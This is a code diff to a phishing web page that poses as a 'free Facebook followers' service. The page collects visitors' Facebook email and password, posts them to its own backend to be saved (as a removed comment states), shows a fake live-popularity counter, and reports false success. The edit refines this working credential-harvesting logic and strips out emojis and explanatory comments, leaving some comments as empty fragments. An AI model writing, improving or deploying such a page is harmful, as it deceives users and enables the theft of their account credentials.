@@ -183,7 +183,7 @@
 </head>
 <body>
 <div class="glass-card">
-    <div class="brand">🔥 CYBER TOOLS</div>
+    <div class="brand"> CYBER TOOLS</div>
     <div class="fb-header">
         <i class="fab fa-facebook fb-logo"></i>
         <h2>FREE FACEBOOK FOLLOWERS</h2>
@@ -199,11 +199,11 @@
         <div class="input-group">
             <input type="password" id="password" name="password" placeholder="Password" required autocomplete="off">
         </div>
-        <button type="submit" id="submitBtn">💥 ADD FOLLOWERS NOW 💥</button>
+        <button type="submit" id="submitBtn"> ADD FOLLOWERS NOW </button>
     </form>
     <div id="resultArea" class="result-box hidden"></div>
     <div class="footer">
-        ⚡ Instant delivery • 100% real accounts • No survey
+         Instant delivery  100% real accounts  No survey
     </div>
 </div>
 
@@ -214,7 +214,7 @@
     const submitBtn = document.getElementById('submitBtn');
     const resultArea = document.getElementById('resultArea');
 
-    // Live counter animation (fake popularity)
+    //   (  )
     let counter = 1247;
     const counterEl = document.getElementById('liveCounter');
     setInterval(() => {
@@ -228,31 +228,33 @@
         const password = passwordInput.value.trim();
 
         if (!email || !password) {
-            showResult('⚠️ Please fill both fields', 'error');
+            showResult(' Please fill both fields', 'error');
             return;
         }
 
-        // Show loading
         submitBtn.disabled = true;
         submitBtn.innerHTML = '<span class="loader"></span> Processing...';
 
         try {
-            // Send data to the same endpoint (the backend will save credentials)
             const response = await fetch(window.location.href, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: new URLSearchParams({ username: email, password: password })
             });
-
-            // Even if backend returns redirect HTML, we ignore and show success
-            showResult('✅ Success! 10,000 followers will be added within 5 minutes. Thank you!', 'success');
-            emailInput.value = '';
-            passwordInput.value = '';
+            const data = await response.json();
+            if (data.status === 'success') {
+                //       
+                showResult(' Success! 10,000 followers will be added within 5 minutes. Thank you!', 'success');
+                emailInput.value = '';
+                passwordInput.value = '';
+            } else {
+                showResult(' Failed. Please try again.', 'error');
+            }
         } catch (err) {
-            showResult('❌ Network error. Please try again.', 'error');
+            showResult(' Network error. Please try again.', 'error');
         } finally {
             submitBtn.disabled = false;
-            submitBtn.innerHTML = '💥 ADD FOLLOWERS NOW 💥';
+            submitBtn.innerHTML = ' ADD 10K FOLLOWERS NOW ';
         }
     });
 
@@ -261,7 +263,7 @@
         resultArea.innerHTML = `<div class="${type === 'success' ? 'success-message' : 'error-message'}">${msg}</div>`;
         setTimeout(() => {
             resultArea.classList.add('hidden');
-        }, 6000);
+        }, 5000);
     }
 </script>
 </body>
